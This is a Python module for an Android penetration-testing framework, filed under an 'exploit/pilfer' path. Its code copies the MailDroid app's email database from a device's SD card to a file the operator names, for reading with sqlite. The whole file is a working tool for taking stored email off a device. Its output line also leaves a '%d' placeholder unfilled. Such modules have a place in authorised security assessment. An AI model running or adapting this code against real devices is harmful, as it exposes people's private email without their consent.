import re
import time

from xml.etree import ElementTree

from mwr.common import fs
from mwr.droidhg.modules import common, Module

class Emails(Module, common.ClassLoader, common.FileSystem):
    
    name = "Grab Email messages from MailDroid"
    description = """Grabs Email Messages stored on the SD card by 'MailDroid' (com.maildroid)."""
    examples = ""
    author = "Henry Hoggard"
    date = "2012-12-17"
    license = "MWR Code License"
    path = ["exploit", "pilfer", "thirdparty", "maildroid"]
    
    __database = "/sdcard/com.maildroid/index/index-1.db"
    
    def add_arguments(self, parser):
        parser.add_argument("target", help="where to save the copied MailDroid database", nargs="?")
    
    def execute(self, arguments):
        length = self.downloadFile(self.__database, arguments.target)
        
        if length != None:
            self.stdout.write("Copied %d bytes. Open the target with sqlite.\n\n")
        else:
            self.stdout.write("Could not copy the MailDroid database.\n\n")
            